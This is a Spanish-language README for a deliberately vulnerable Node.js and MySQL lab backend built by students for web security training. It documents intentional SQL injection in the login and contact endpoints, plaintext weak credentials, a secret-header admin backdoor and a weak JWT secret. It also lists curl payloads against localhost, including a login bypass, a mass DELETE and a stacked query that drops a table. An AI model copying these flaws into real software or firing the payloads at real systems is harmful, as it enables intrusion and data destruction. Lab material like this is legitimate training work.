# Honeypot Security Lab - Backend

## ADVERTENCIA IMPORTANTE

**Este es un proyecto educativo que contiene vulnerabilidades INTENCIONALES.**

-   NO usar en producción
-   NO exponer a internet
-   Solo para entornos de laboratorio aislados
-   Con fines educativos y de investigación en seguridad

---

## Descripción

Backend vulnerable diseñado como honeypot/laboratorio de hacking para aprender sobre:

-   Inyección SQL
-   Autenticación débil
-   Backdoors en aplicaciones web
-   Análisis de logs de seguridad

## Vulnerabilidades Implementadas

### 1. SQL Injection en Login

**Endpoint vulnerable:** `POST /api/auth/login`

El endpoint de login es vulnerable a inyección SQL mediante concatenación directa de strings:

```javascript
// CÓDIGO VULNERABLE (intencional)
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**Ejemplos de explotación:**

```bash
# Bypass con comentario SQL
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"anything"}'

# Always true condition
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' OR '\''1'\''='\''1","password":"anything"}'
```

### 2. SQL Injection en Formulario de Contacto

**Endpoints vulnerables:** `POST /api/contacts`, `GET /api/contacts`, `DELETE /api/contacts/:id`

El sistema de contactos es completamente vulnerable a inyección SQL mediante concatenación directa de valores:

```javascript
// CÓDIGO VULNERABLE (intencional)
const query = `INSERT INTO contacts (nombre, email, mensaje, ip_address) 
               VALUES ('${name}', '${email}', '${message}', '${ip_address}')`;
```

**Ejemplos de explotación:**

```bash
# Inyección en campo nombre
curl -X POST http://localhost:3000/api/contacts \
  -H "Content-Type: application/json" \
  -d '{"name":"test'\'' OR '\''1'\''='\''1","email":"test@test.com","message":"msg"}'

# Búsqueda vulnerable
curl "http://localhost:3000/api/contacts?search=test'\'' OR '\''1'\''='\''1"

# DELETE masivo
curl -X DELETE "http://localhost:3000/api/contacts/1 OR 1=1"
```

**Características de la vulnerabilidad:**

-   Concatenación directa sin prepared statements
-   Errores SQL expuestos en respuestas
-   Permite stacked queries (multipleStatements: true)
-   Sin validación de entrada
-   Sin sanitización de datos

### 3. Credenciales Débiles

La base de datos contiene múltiples usuarios con contraseñas débiles:

| Usuario           | Contraseña       | Rol   | Descripción             |
| ----------------- | ---------------- | ----- | ----------------------- |
| `admin`           | `admin`          | admin | Administrador principal |
| `administrator`   | `password`       | admin | Admin alternativo       |
| `root`            | `root123`        | admin | Cuenta root             |
| `dev_backup`      | `Dev@2024!`      | admin | Cuenta de desarrollo    |
| `service_account` | `ServicePass123` | admin | Cuenta de servicio      |
| `user1`           | `user123`        | user  | Usuario regular         |
| `testuser`        | `test123`        | user  | Usuario de prueba       |
| `guest`           | `guest`          | user  | Invitado                |

**Nota:** Las contraseñas están almacenadas en **texto plano** (otra vulnerabilidad intencional).

### 4. Backdoor - Header Personalizado

**Header secreto:** `X-AccessDev: Testing-Mode`

Permite bypass completo de autenticación JWT y acceso con privilegios de administrador.

**Cómo funciona:**

1. El middleware `backdoorMiddleware.js` detecta el header
2. Si el valor coincide con `Testing-Mode`, otorga acceso admin
3. Bypasea la validación de JWT
4. Registra el acceso en `audit_log` con acción `backdoor_access`

**Endpoints vulnerables al backdoor:**

-   `GET /api/admin/users` - Lista todos los usuarios
-   `GET /api/admin/stats` - Estadísticas de la base de datos
-   `GET /api/admin/audit-logs` - Logs de auditoría
-   `DELETE /api/admin/users/:id` - Eliminar usuarios

**Ejemplo de uso:**

```bash
# Acceder a usuarios sin autenticación
curl http://localhost:3000/api/admin/users \
  -H "X-AccessDev: Testing-Mode"

# Obtener estadísticas
curl http://localhost:3000/api/admin/stats \
  -H "X-AccessDev: Testing-Mode"

# Ver logs de auditoría
curl http://localhost:3000/api/admin/audit-logs?limit=10 \
  -H "X-AccessDev: Testing-Mode"
```

**Pistas dejadas intencionalmente:**

-   Comentario HTML en `index.html` del frontend revelando el header
-   Variable de entorno `BACKDOOR_DEV_HEADER` en `.env.example`
-   Mensaje en el endpoint raíz `/` con hint sobre "developer access"

### 5. Configuración Insegura de Base de Datos

**multipleStatements habilitado**

La conexión MySQL está configurada con `multipleStatements: true`, permitiendo la ejecución de múltiples consultas SQL en una sola llamada:

```javascript
pool = mysql.createPool({
    // ... otras opciones
    multipleStatements: true, // INSEGURO en producción
});
```

Esto permite ataques de stacked queries:

```bash
# Inyección con múltiples statements
curl -X POST http://localhost:3000/api/contacts \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","message":"msg'\''); DROP TABLE contacts; --"}'
```

---

## Instalación y Configuración

### Requisitos Previos

-   Node.js 18+
-   Docker y Docker Compose
-   PowerShell (para scripts de testing en Windows)

### Paso 1: Clonar e Instalar Dependencias

```bash
cd ENTREGA/Backend
npm install
```

### Paso 2: Configurar Variables de Entorno

Crea un archivo `.env`:

```env
# Database
DB_HOST=localhost
DB_PORT=3306
DB_USER=root
DB_PASSWORD=vulnerable123
DB_NAME=honeypot_db

# Server
PORT=3000
NODE_ENV=development

# JWT (intencionalmente débil)
JWT_SECRET=weak_secret_key_123
JWT_EXPIRES_IN=24h

# CORS
CORS_ORIGIN=http://localhost:5173

# Backdoor (secreto)
BACKDOOR_DEV_HEADER=Testing-Mode
```

### Paso 3: Iniciar Base de Datos

```bash
# Iniciar MySQL y phpMyAdmin
docker-compose up -d

# Verificar que MySQL esté running
docker ps
```

### Paso 4: Inicializar Base de Datos

```bash
# Ejecutar schema y seeds
npm run init-db
```

Esto creará:

-   Tabla `users` con 8 usuarios y credenciales débiles
-   Tabla `products` con productos de ejemplo
-   Tabla `orders` con órdenes de ejemplo
-   Tabla `contacts` (vulnerable a SQL injection)
-   Tabla `order_items` con items de órdenes
-   Tabla `audit_log` para registros de seguridad

### Paso 5: Iniciar Servidor

```bash
# Modo desarrollo (con auto-reload)
npm run dev

# Modo producción
npm start
```

El servidor estará disponible en: `http://localhost:3000`

phpMyAdmin en: `http://localhost:8080`

-   Usuario: `root`
-   Contraseña: `vulnerable123`

---

## Testing y Explotación

### Archivos de Prueba Incluidos

El directorio `Backend/requests/` contiene archivos REST para testing:

-   `auth.rest` - Autenticación y login
-   `sql-injection.rest` - Ejemplos de SQL injection en login
-   `contact-injection.rest` - SQL injection en formulario de contacto
-   `backdoor.rest` - Uso del backdoor con header secreto
-   `admin.rest` - Endpoints administrativos
-   `products.rest` - Operaciones con productos
-   `orders.rest` - Gestión de órdenes
-   `complete-tests.rest` - Suite completa de tests

### Scripts de Testing PowerShell

```bash
# Test completo de todas las vulnerabilidades
.\test-final.ps1

# Test solo SQL Injection
.\test-sql-injection.ps1

# Test solo Backdoor
.\test-backdoor.ps1

# Test simple y rápido
.\test-simple.ps1
```

### Testing Manual

#### 1. Login Normal

```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
```

Respuesta esperada:

```json
{
    "message": "Login successful",
    "token": "eyJhbGc...",
    "user": {
        "id": 1,
        "username": "admin",
        "email": "admin@honeypot.local",
        "role": "admin"
    }
}
```

#### 2. SQL Injection

```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"cualquiercosa"}'
```

**Respuesta esperada:** Debería devolver token válido sin necesitar la contraseña correcta.

#### 3. SQL Injection en Contactos

```bash
# Inyección en campo nombre
curl -X POST http://localhost:3000/api/contacts \
  -H "Content-Type: application/json" \
  -d '{"name":"test'\'' OR '\''1'\''='\''1","email":"test@test.com","message":"mensaje de prueba"}'

# Búsqueda vulnerable
curl "http://localhost:3000/api/contacts?search=test'\'' OR '\''1'\''='\''1"

# DELETE masivo
curl -X DELETE "http://localhost:3000/api/contacts/1 OR 1=1"
```

**Respuesta esperada:** Las consultas deberían ejecutarse sin errores, exponiendo la vulnerabilidad.

#### 4. Backdoor Access

```bash
# Sin backdoor (debería fallar)
curl http://localhost:3000/api/admin/users

# Con backdoor (debería funcionar)
curl http://localhost:3000/api/admin/users \
  -H "X-AccessDev: Testing-Mode"
```

---

## Estructura del Proyecto

```
Backend/
├── src/
│   ├── server.js                 # Servidor Express principal
│   ├── config/
│   │   ├── config.js             # Configuración general
│   │   └── database.js           # Conexión MySQL + funciones query
│   ├── controllers/
│   │   ├── authController.js     # Login, Register (VULNERABLE)
│   │   ├── adminController.js    # Endpoints admin
│   │   ├── contactController.js  # CRUD Contactos (VULNERABLE)
│   │   ├── productController.js  # Gestión de productos
│   │   └── orderController.js    # Gestión de órdenes
│   ├── middlewares/
│   │   ├── authMiddleware.js     # Validación JWT
│   │   ├── backdoorMiddleware.js # Backdoor con header secreto
│   │   └── adminGuard.js         # Verificar rol admin
│   ├── routes/
│   │   ├── authRoutes.js
│   │   ├── adminRoutes.js
│   │   ├── contactRoutes.js      # Rutas vulnerables de contactos
│   │   ├── productRoutes.js
│   │   └── orderRoutes.js
│   ├── database/
│   │   └── schema.sql             # Schema + seeds vulnerables
│   └── scripts/
│       └── initDatabase.js        # Script de inicialización DB
├── requests/
│   ├── auth.rest
│   ├── sql-injection.rest
│   ├── contact-injection.rest     # Tests de inyección en contactos
│   ├── backdoor.rest
│   ├── admin.rest
│   ├── products.rest
│   ├── orders.rest
│   └── complete-tests.rest
├── docker-compose.yml
├── package.json
├── .env.example
└── README.md
```

---

## Endpoints API

### Públicos

| Método | Endpoint             | Descripción       | Vulnerable    |
| ------ | -------------------- | ----------------- | ------------- |
| GET    | `/`                  | Info del honeypot | -             |
| GET    | `/health`            | Health check      | -             |
| POST   | `/api/auth/login`    | Login             | SQL Injection |
| POST   | `/api/auth/register` | Registro          | -             |

### Protegidos (requieren JWT)

| Método | Endpoint            | Descripción        | Backdoor |
| ------ | ------------------- | ------------------ | -------- |
| GET    | `/api/auth/profile` | Perfil del usuario | No       |

### Admin (requieren JWT + rol admin)

| Método | Endpoint                | Descripción      | Backdoor |
| ------ | ----------------------- | ---------------- | -------- |
| GET    | `/api/admin/users`      | Lista usuarios   | Si       |
| GET    | `/api/admin/stats`      | Estadísticas DB  | Si       |
| GET    | `/api/admin/audit-logs` | Logs auditoría   | Si       |
| DELETE | `/api/admin/users/:id`  | Eliminar usuario | Si       |

### Contactos (VULNERABLES a SQL Injection)

| Método | Endpoint            | Descripción         | Vulnerable    |
| ------ | ------------------- | ------------------- | ------------- |
| POST   | `/api/contacts`     | Crear contacto      | SQL Injection |
| GET    | `/api/contacts`     | Listar contactos    | SQL Injection |
| GET    | `/api/contacts/:id` | Detalle de contacto | SQL Injection |
| DELETE | `/api/contacts/:id` | Eliminar contacto   | SQL Injection |

### Productos

| Método | Endpoint            | Descripción       | Vulnerable |
| ------ | ------------------- | ----------------- | ---------- |
| GET    | `/api/products`     | Listar productos  | No         |
| GET    | `/api/products/:id` | Detalle producto  | No         |
| POST   | `/api/products`     | Crear producto    | No         |
| PUT    | `/api/products/:id` | Actualizar prod.  | No         |
| DELETE | `/api/products/:id` | Eliminar producto | No         |

### Órdenes

| Método | Endpoint               | Descripción           | Vulnerable |
| ------ | ---------------------- | --------------------- | ---------- |
| POST   | `/api/orders`          | Crear orden           | No         |
| GET    | `/api/orders/user/:id` | Órdenes de un usuario | No         |

**Nota:** Todos los endpoints admin pueden ser accedidos con el header `X-AccessDev: Testing-Mode`

---

## Estado Actual del Proyecto

**Última actualización:** Diciembre 2025

El backend está completamente operativo con las siguientes características:

### Funcionalidades Implementadas

-   Servidor Express corriendo en `http://localhost:3000`
-   Base de datos MySQL con Docker Compose
-   Sistema de autenticación JWT
-   CRUD completo de productos
-   Gestión de órdenes de compra
-   Sistema de contactos (vulnerable)
-   Auditoría de eventos de seguridad

### Vulnerabilidades Activas

1. **SQL Injection en Login** - Endpoint `/api/auth/login`
2. **SQL Injection en Contactos** - Todos los endpoints `/api/contacts`
3. **Backdoor con Header** - Header `X-AccessDev: Testing-Mode`
4. **Credenciales Débiles** - 8 usuarios con contraseñas en texto plano
5. **multipleStatements Habilitado** - Permite stacked queries

### Archivos de Prueba Disponibles

Directorio `Backend/requests/`:

-   `auth.rest` - Tests de autenticación
-   `sql-injection.rest` - Payloads de inyección SQL en login
-   `contact-injection.rest` - Payloads de inyección en contactos
-   `backdoor.rest` - Ejemplos de uso del backdoor
-   `admin.rest` - Endpoints administrativos
-   `products.rest` - CRUD de productos
-   `orders.rest` - Gestión de órdenes
-   `complete-tests.rest` - Suite completa de pruebas

### Scripts PowerShell de Testing

-   `test-final.ps1` - Suite completa de vulnerabilidades
-   `test-sql-injection.ps1` - Test específico de SQL injection
-   `test-backdoor.ps1` - Test del backdoor
-   `test-simple.ps1` - Test rápido de funcionalidad básica

### Configuración de Base de Datos

La base de datos incluye las siguientes tablas:

-   `users` - Usuarios con credenciales débiles
-   `products` - Catálogo de productos
-   `orders` - Órdenes de compra
-   `order_items` - Detalles de órdenes
-   `contacts` - Formulario de contacto (vulnerable)
-   `audit_log` - Registros de auditoría

### Recomendaciones de Uso

Para reiniciar el entorno de pruebas:

```powershell
cd Backend
docker-compose down -v
docker-compose up -d
npm run init-db
npm run dev
```

Para verificar logs de auditoría:

```sql
SELECT * FROM audit_log ORDER BY created_at DESC LIMIT 20;
```

**IMPORTANTE:** Este proyecto contiene vulnerabilidades intencionales. Nunca exponerlo a internet ni usar en entornos de producción.

---

## Mecanismos de Seguridad (Débiles Intencionalmente)

### 1. Autenticación JWT

-   Secret débil: `weak_secret_key_123`
-   Expiración larga: 24 horas
-   No hay refresh tokens
-   No hay revocación de tokens

### 2. CORS

-   Configurado para `http://localhost:5173`
-   Acepta credenciales
-   No valida origins en profundidad

### 3. Rate Limiting

-   NO IMPLEMENTADO (vulnerabilidad intencional)

### 4. Password Hashing

-   NO IMPLEMENTADO - Contraseñas en texto plano

### 5. Prepared Statements

-   Implementados en `executeQuery()` (seguro)
-   NO usados en login y contactos (vulnerable)
-   `executeRawQuery()` permite SQL injection directo

### 6. Validación de Entrada

-   NO IMPLEMENTADA en endpoints vulnerables
-   Sin sanitización de datos
-   Sin escape de caracteres especiales

---

## Auditoría y Logs

Todas las acciones importantes se registran en la tabla `audit_log`:

```sql
SELECT * FROM audit_log ORDER BY created_at DESC LIMIT 10;
```

Campos registrados:

-   `action`: Tipo de acción (login, backdoor_access, etc.)
-   `user_id`: ID del usuario (si aplica)
-   `details`: Detalles adicionales
-   `ip_address`: IP del cliente
-   `user_agent`: User agent del navegador
-   `created_at`: Timestamp

**Acciones registradas:**

-   `user_login` - Login exitoso
-   `user_registered` - Nuevo usuario registrado
-   `backdoor_access` - Acceso mediante backdoor
-   `profile_accessed` - Acceso al perfil

---

## Uso Educativo

### Escenarios de Aprendizaje

1. **Pentesting Web:**

    - Identificar vectores de SQL Injection
    - Explotar autenticación débil
    - Buscar backdoors y headers secretos
    - Practicar técnicas de enumeración

2. **Análisis Forense:**

    - Revisar logs de `audit_log`
    - Identificar accesos no autorizados
    - Rastrear uso del backdoor
    - Correlacionar eventos de seguridad

3. **Hardening de Aplicaciones:**

    - Comparar código vulnerable vs código seguro
    - Implementar prepared statements
    - Agregar validación de inputs
    - Configurar rate limiting

4. **Red Team / Blue Team:**
    - Red Team: Explotar todas las vulnerabilidades
    - Blue Team: Detectar y mitigar ataques en logs
    - Documentar hallazgos y recomendaciones

---

## Comandos Útiles

```bash
# Ver logs del servidor
npm run dev

# Reiniciar base de datos
docker-compose down -v
docker-compose up -d
npm run init-db

# Ver logs de MySQL
docker-compose logs mysql

# Acceder a MySQL directamente
docker exec -it honeypot-mysql mysql -u root -pvulnerable123 honeypot_db

# Ver usuarios en DB
docker exec -it honeypot-mysql mysql -u root -pvulnerable123 -e "SELECT * FROM honeypot_db.users;"

# Ver logs de auditoría
docker exec -it honeypot-mysql mysql -u root -pvulnerable123 -e "SELECT * FROM honeypot_db.audit_log ORDER BY created_at DESC LIMIT 20;"
```

---

## Troubleshooting

### Puerto 3000 ya en uso

```bash
# Windows PowerShell
Get-Process -Id (Get-NetTCPConnection -LocalPort 3000).OwningProcess | Stop-Process -Force

# Linux/Mac
lsof -ti:3000 | xargs kill -9
```

### MySQL no conecta

```bash
# Verificar que el contenedor esté running
docker ps

# Ver logs de MySQL
docker-compose logs mysql

# Reiniciar contenedor
docker-compose restart mysql
```

### Error ECONNREFUSED en tests

-   Asegurarse de que el servidor esté corriendo: `npm run dev`
-   Esperar 3-5 segundos después de iniciar antes de ejecutar tests
-   Verificar que el puerto sea 3000

### Errores de SQL Injection no funcionan

-   Verificar que `multipleStatements: true` esté habilitado en `database.js`
-   Revisar logs del servidor para ver queries ejecutadas
-   Asegurarse de escapar comillas correctamente en curl/PowerShell

### Backdoor no funciona

-   Verificar el header exacto: `X-AccessDev: Testing-Mode`
-   Usar mayúsculas y minúsculas correctamente
-   Revisar que el middleware esté configurado en las rutas admin

---

## Referencias

-   [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
-   [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
-   [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
-   [MySQL Prepared Statements](https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html)
-   [Express.js Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)

---

## Licencia

Este proyecto es solo para fines educativos. No nos hacemos responsables del mal uso de este código.

---

## Autores

-   Serniotti, Guido
-   Ibarra, Álvaro
-   Zegatti, Tomás

(Proyecto creado como laboratorio de seguridad informática para aprendizaje de vulnerabilidades web comunes.)

**IMPORTANTE:** Este código contiene vulnerabilidades intencionales. **NUNCA** usar en producción o exponer a internet.
